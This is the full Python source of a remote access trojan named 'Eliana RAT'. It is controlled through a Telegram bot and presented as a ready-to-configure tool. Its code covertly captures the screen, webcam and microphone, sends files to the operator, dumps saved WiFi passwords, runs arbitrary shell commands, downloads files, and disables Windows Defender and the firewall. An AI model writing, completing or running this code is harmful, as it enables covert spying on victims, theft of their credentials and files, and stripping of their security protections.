# ==================== CONFIG ====================
# REPLACE THESE WITH YOUR CREDENTIALS!
TELEGRAM_TOKEN = "Bot API Key"
TELEGRAM_CHAT_ID = "User ID"
# ===============================================

# ==================== IMPORTS ====================
import os, sys, time, subprocess, platform, shutil, datetime, threading, tempfile, urllib.request, json, re, base64, zlib, marshal, types

# ==================== OBFUSCATION WRAPPERS ====================
def encrypt_data(data):
    """Obfuscate strings"""
    return base64.b64encode(zlib.compress(marshal.dumps(data))).decode()

def decrypt_data(encrypted):
    """Deobfuscate strings"""
    return marshal.loads(zlib.decompress(base64.b64decode(encrypted)))

# ==================== TELEGRAM FUNCTIONS ====================
def send_telegram_message(text):
    """Send message to Telegram"""
    try:
        import requests
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}
        response = requests.post(url, data=data, timeout=10)
        return response.ok
    except:
        return False

def send_telegram_file(filepath):
    """Send file to Telegram"""
    try:
        import requests
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
        with open(filepath, 'rb') as file:
            files = {'document': file}
            data = {'chat_id': TELEGRAM_CHAT_ID}
            response = requests.post(url, files=files, data=data, timeout=60)
            return response.ok
    except:
        return False

def download_file(url, save_as):
    """Download file from URL"""
    try:
        urllib.request.urlretrieve(url, save_as)
        return True
    except:
        return False

def run_command(cmd):
    """Execute shell command"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout or result.stderr or "Command executed"
    except:
        return "Error executing command"

# ==================== SCREEN CAPTURE ====================
def take_screenshot():
    """Capture screenshot"""
    try:
        from PIL import ImageGrab
        filename = f"screenshot_{int(time.time())}.png"
        ImageGrab.grab().save(filename)
        if send_telegram_file(filename):
            os.remove(filename)
            return "🖥️ <b>Screenshot Captured</b>\n📸 Sent successfully"
        return "❌ Upload failed"
    except ImportError:
        return "❌ Install: <code>pip install pillow</code>"
    except:
        return "❌ Screen capture failed"

def record_screen(seconds=10):
    """Record screen"""
    try:
        import cv2
        import numpy as np
        from PIL import ImageGrab
        
        filename = f"screen_record_{int(time.time())}.mp4"
        
        # Get screen size
        screen = ImageGrab.grab()
        width, height = screen.size
        
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        video_writer = cv2.VideoWriter(filename, fourcc, 10.0, (width, height))
        
        start_time = time.time()
        while time.time() - start_time < seconds:
            img = ImageGrab.grab()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            video_writer.write(frame)
            time.sleep(0.1)
        
        video_writer.release()
        
        if send_telegram_file(filename):
            os.remove(filename)
            return f"🎬 <b>Screen Recorded</b>\n⏱️ {seconds} seconds sent"
        return "❌ Upload failed"
    except:
        return "❌ Screen recording failed"

# ==================== WEBCAM FUNCTIONS ====================
def webcam_photo():
    """Take webcam photo"""
    try:
        import cv2
        camera = cv2.VideoCapture(0)
        success, frame = camera.read()
        camera.release()
        
        if success:
            filename = f"webcam_{int(time.time())}.jpg"
            cv2.imwrite(filename, frame)
            if send_telegram_file(filename):
                os.remove(filename)
                return "📷 <b>Webcam Photo</b>\n✅ Sent successfully"
        return "❌ Webcam error"
    except ImportError:
        return "❌ Install: <code>pip install opencv-python</code>"
    except:
        return "❌ Webcam failed"

def webcam_video(seconds=10):
    """Record webcam video"""
    try:
        import cv2
        filename = f"webcam_video_{int(time.time())}.mp4"
        camera = cv2.VideoCapture(0)
        
        width = int(camera.get(3))
        height = int(camera.get(4))
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        video_writer = cv2.VideoWriter(filename, fourcc, 20.0, (width, height))
        
        start_time = time.time()
        while time.time() - start_time < seconds:
            success, frame = camera.read()
            if success:
                video_writer.write(frame)
            time.sleep(0.05)
        
        camera.release()
        video_writer.release()
        cv2.destroyAllWindows()
        
        if send_telegram_file(filename):
            os.remove(filename)
            return f"🎥 <b>Webcam Video</b>\n⏱️ {seconds} seconds sent"
        return "❌ Upload failed"
    except ImportError:
        return "❌ Install: <code>pip install opencv-python</code>"
    except:
        return "❌ Recording failed"

# ==================== AUDIO RECORDING ====================
def record_audio(seconds=10):
    """Record microphone audio"""
    try:
        import sounddevice as sd
        import soundfile as sf
        import numpy as np
        
        filename = f"audio_{int(time.time())}.wav"
        sample_rate = 44100
        
        # Record audio
        recording = sd.rec(int(seconds * sample_rate), samplerate=sample_rate, channels=2, dtype='float32')
        sd.wait()
        
        # Save as WAV
        sf.write(filename, recording, sample_rate)
        
        if send_telegram_file(filename):
            os.remove(filename)
            return f"🎤 <b>Audio Recorded</b>\n⏱️ {seconds} seconds sent"
        return "❌ Upload failed"
    except ImportError:
        # Fallback to pyaudio
        try:
            import pyaudio
            import wave
            
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 2
            RATE = 44100
            filename = f"audio_{int(time.time())}.wav"
            
            audio = pyaudio.PyAudio()
            stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE,
                              input=True, frames_per_buffer=CHUNK)
            
            frames = []
            for _ in range(0, int(RATE / CHUNK * seconds)):
                data = stream.read(CHUNK)
                frames.append(data)
            
            stream.stop_stream()
            stream.close()
            audio.terminate()
            
            wf = wave.open(filename, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(audio.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            
            if send_telegram_file(filename):
                os.remove(filename)
                return f"🎤 <b>Audio Recorded</b>\n⏱️ {seconds} seconds sent"
            return "❌ Upload failed"
        except:
            return "❌ Install: <code>pip install pyaudio</code> or <code>pip install sounddevice soundfile</code>"
    except:
        return "❌ Audio recording failed"

# ==================== FILE OPERATIONS ====================
def list_directory(path="."):
    """List files and directories"""
    try:
        files = os.listdir(path)
        if not files:
            return "📁 Empty directory"
        
        directories = []
        file_list = []
        
        for item in files:
            full_path = os.path.join(path, item)
            if os.path.isdir(full_path):
                directories.append(f"📁 {item}/")
            else:
                size = os.path.getsize(full_path)
                file_list.append(f"📄 {item} ({size:,} bytes)")
        
        result = [f"📂 <b>Directory: {path}</b>", "─" * 40]
        
        if directories:
            result.append("\n<b>Folders:</b>")
            result.extend(directories[:10])
        
        if file_list:
            result.append("\n<b>Files:</b>")
            result.extend(file_list[:10])
        
        if len(directories) > 10 or len(file_list) > 10:
            result.append(f"\n📊 <i>Showing 10 of {len(directories) + len(file_list)} items</i>")
        
        return "\n".join(result)
    except:
        return "❌ Cannot list directory"

def change_directory(path):
    """Change current directory"""
    try:
        if os.path.isdir(path):
            os.chdir(path)
            current = os.getcwd()
            return f"📁 <b>Changed to:</b>\n<code>{current}</code>"
        return f"❌ Directory not found: {path}"
    except:
        return "❌ Error changing directory"

def read_file(filename):
    """Read file contents"""
    try:
        if os.path.exists(filename):
            with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
                content = file.read(3000)
            size = os.path.getsize(filename)
            return f"""📄 <b>{os.path.basename(filename)}</b>
📏 Size: {size:,} bytes
────────────────
<pre>{content}</pre>"""
        return f"❌ File not found: {filename}"
    except:
        return "❌ Cannot read file"

# ==================== SYSTEM INFORMATION ====================
def system_info():
    """Get system information"""
    info = f"""💻 <b>System Information</b>
────────────────
👤 User: {os.getlogin()}
🖥️ Computer: {platform.node()}
⚙️ OS: {platform.system()} {platform.release()}
🏗️ Architecture: {platform.machine()}
📁 Current Dir: {os.getcwd()}
🕐 Time: {datetime.datetime.now().strftime('%H:%M:%S')}"""
    
    try:
        import psutil
        info += f"\n🧠 RAM: {psutil.virtual_memory().percent}% used"
        info += f"\n🔥 CPU: {psutil.cpu_percent()}% used"
        info += f"\n💾 Disk: {psutil.disk_usage('.').free // (1024**3)} GB free"
    except:
        pass
    
    return info

def wifi_passwords():
    """Extract WiFi passwords"""
    try:
        run_command('netsh wlan export profile key=clear')
        passwords = []
        
        for file in os.listdir('.'):
            if file.endswith('.xml'):
                with open(file, 'r') as f:
                    content = f.read()
                ssid = re.search(r'<name>(.*?)</name>', content)
                password = re.search(r'<keyMaterial>(.*?)</keyMaterial>', content)
                if ssid and password:
                    passwords.append(f"📶 <b>{ssid.group(1)}</b>\n   🔑 {password.group(1)}")
                os.remove(file)
        
        if passwords:
            return f"""📶 <b>WiFi Passwords</b>
────────────────
{chr(10).join(passwords[:10])}"""
        return "❌ No WiFi profiles found"
    except:
        return "❌ WiFi extraction failed"

# ==================== COMMAND HANDLER ====================
def handle_command(command_input):
    """Process and execute commands"""
    parts = command_input.strip().split()
    if not parts:
        return "❌ Empty command\nType: help"
    
    cmd = parts[0].lower()
    
    # Help command
    if cmd in ['help', '?']:
        return """📋 <b>Available Commands</b>
────────────────
<b>📸 MEDIA CAPTURE:</b>
<code>screenshot</code> - Take screenshot
<code>screenrec 10</code> - Record screen (seconds)
<code>webcam</code> - Webcam photo
<code>webcam 10</code> - Webcam video (seconds)
<code>audio 10</code> - Record audio (seconds)

<b>📁 FILE OPERATIONS:</b>
<code>ls</code> or <code>dir</code> - List files
<code>cd folder</code> - Change directory
<code>cd..</code> - Go up one level
<code>cd\</code> or <code>cd/</code> - Go to root
<code>read file.txt</code> - Read file
<code>download URL</code> - Download file
<code>upload file.txt</code> - Upload to me
<code>pwd</code> - Show current directory

<b>💻 SYSTEM INFORMATION:</b>
<code>sysinfo</code> - System information
<code>wifi</code> - WiFi passwords
<code>ps</code> - Running processes
<code>netstat</code> - Network connections
<code>ip</code> - IP configuration

<b>⚡ SYSTEM CONTROL:</b>
<code>shutdown</code> - Shutdown computer
<code>reboot</code> - Restart computer
<code>lock</code> - Lock workstation
<code>defender</code> - Disable Windows Defender

<b>🔧 UTILITIES:</b>
<code>cmd command</code> - Execute shell command
<code>clear</code> - Clear screen"""
    
    # Media commands
    elif cmd == 'screenshot':
        return take_screenshot()
    elif cmd == 'screenrec':
        seconds = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10
        return record_screen(seconds)
    elif cmd == 'webcam':
        if len(parts) > 1 and parts[1].isdigit():
            seconds = int(parts[1])
            return webcam_video(seconds)
        return webcam_photo()
    elif cmd == 'audio':
        seconds = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10
        return record_audio(seconds)
    
    # File operations
    elif cmd == 'ls' or cmd == 'dir':
        path = parts[1] if len(parts) > 1 else "."
        return list_directory(path)
    elif cmd == 'cd':
        if len(parts) > 1:
            return change_directory(parts[1])
        return "❌ Specify directory: <code>cd folder</code>"
    elif cmd == 'cd..':
        return change_directory('..')
    elif cmd == 'cd\\' or cmd == 'cd/':
        return change_directory('C:\\' if platform.system() == 'Windows' else '/')
    elif cmd == 'read':
        if len(parts) > 1:
            return read_file(parts[1])
        return "❌ Specify file: <code>read file.txt</code>"
    elif cmd == 'pwd':
        return f"📁 <b>Current Directory:</b>\n<code>{os.getcwd()}</code>"
    
    # Download/Upload
    elif cmd == 'download':
        if len(parts) > 1:
            url = parts[1]
            filename = url.split('/')[-1] or f"download_{int(time.time())}"
            if download_file(url, filename):
                return f"✅ <b>Downloaded:</b>\n📥 <code>{filename}</code>"
            return "❌ Download failed"
        return "❌ Specify URL: <code>download https://example.com/file.zip</code>"
    
    elif cmd == 'upload':
        if len(parts) > 1:
            filepath = parts[1]
            if os.path.exists(filepath):
                if send_telegram_file(filepath):
                    return f"✅ <b>Uploaded:</b>\n📤 <code>{os.path.basename(filepath)}</code>"
                return "❌ Upload failed"
            return f"❌ File not found: <code>{filepath}</code>"
        return "❌ Specify file: <code>upload file.txt</code>"
    
    # System information
    elif cmd == 'sysinfo':
        return system_info()
    elif cmd == 'wifi':
        return wifi_passwords()
    elif cmd == 'ps':
        result = run_command('tasklist')
        return f"""📊 <b>Running Processes</b>
────────────────
<pre>{result[:1500]}</pre>"""
    elif cmd == 'netstat':
        result = run_command('netstat -ano')
        return f"""🌐 <b>Network Connections</b>
────────────────
<pre>{result[:1500]}</pre>"""
    elif cmd == 'ip':
        result = run_command('ipconfig')
        return f"""🔌 <b>IP Configuration</b>
────────────────
<pre>{result[:1500]}</pre>"""
    
    # System control
    elif cmd == 'shutdown':
        run_command('shutdown /s /t 0')
        return "⏰ <b>Shutting down computer...</b>"
    elif cmd == 'reboot':
        run_command('shutdown /r /t 0')
        return "🔄 <b>Restarting computer...</b>"
    elif cmd == 'lock':
        run_command('rundll32.exe user32.dll,LockWorkStation')
        return "🔐 <b>Workstation locked</b>"
    elif cmd == 'defender':
        run_command('powershell Set-MpPreference -DisableRealtimeMonitoring $true')
        run_command('netsh advfirewall set allprofiles state off')
        return "🛡️ <b>Windows Defender disabled</b>\n✅ Real-time monitoring off\n✅ Firewall disabled"
    elif cmd == 'clear':
        return "🧹 <b>Screen cleared</b>"
    
    # Shell commands
    elif cmd == 'cmd':
        if len(parts) > 1:
            shell_command = ' '.join(parts[1:])
            result = run_command(shell_command)
            return f"""🔧 <b>Command:</b> <code>{shell_command}</code>
────────────────
<pre>{result}</pre>"""
        return "❌ Specify command: <code>cmd whoami</code>"
    
    else:
        return f"""❌ Unknown command: <code>{cmd}</code>
────────────────
💡 Type <code>help</code> for available commands"""

# ==================== TELEGRAM BOT ====================
last_update_id = 0

def get_telegram_updates():
    """Get new messages from Telegram"""
    global last_update_id
    try:
        import requests
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates"
        params = {'offset': last_update_id + 1, 'timeout': 30}
        response = requests.get(url, params=params, timeout=35)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('result'):
                return data['result']
        return []
    except:
        return []

def main():
    """Main function"""
    print("╔══════════════════════════════════════╗")
    print("║       Eliana RAT v1.0 - Active       ║")
    print("╠══════════════════════════════════════╣")
    print(f"║ Target: {TELEGRAM_CHAT_ID:30} ║")
    print(f"║ User: {os.getlogin():32} ║")
    print(f"║ System: {platform.system()} {platform.release():24} ║")
    print("╚══════════════════════════════════════╝")
    print("📡 Waiting for commands...")
    
    # Send connection message
    send_telegram_message(f"""✅ <b>Connection Established</b>
────────────────
💻 <b>Host:</b> {platform.node()}
👤 <b>User:</b> {os.getlogin()}
🖥️ <b>OS:</b> {platform.system()} {platform.release()}
📁 <b>Directory:</b> {os.getcwd()}
🕐 <b>Time:</b> {datetime.datetime.now().strftime('%H:%M:%S')}
────────────────
💡 Type <code>help</code> for commands""")
    
    global last_update_id
    
    while True:
        try:
            updates = get_telegram_updates()
            for update in updates:
                last_update_id = update['update_id']
                
                if 'message' in update and 'text' in update['message']:
                    message = update['message']['text']
                    chat_id = str(update['message']['chat']['id'])
                    
                    if chat_id == TELEGRAM_CHAT_ID:
                        timestamp = datetime.datetime.now().strftime('%H:%M:%S')
                        print(f"[{timestamp}] 📨 Command: {message}")
                        response = handle_command(message)
                        send_telegram_message(response)
                        print(f"[{timestamp}] ✅ Response sent")
            
            time.sleep(2)
            
        except KeyboardInterrupt:
            send_telegram_message("🔴 <b>Session Terminated</b>\nConnection closed by operator")
            print("\n👋 Session ended")
            break
        except Exception as e:
            print(f"⚠ Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    # Check dependencies
    try:
        import requests
        main()
    except ImportError:
        print("❌ Required packages not installed!")
        print("\n📦 Install with:")
        print("pip install requests")
        print("\n📸 For media features (optional):")
        print("pip install pillow opencv-python numpy")
        print("pip install sounddevice soundfile  # For audio")
        print("pip install pyaudio wave           # Alternative audio")
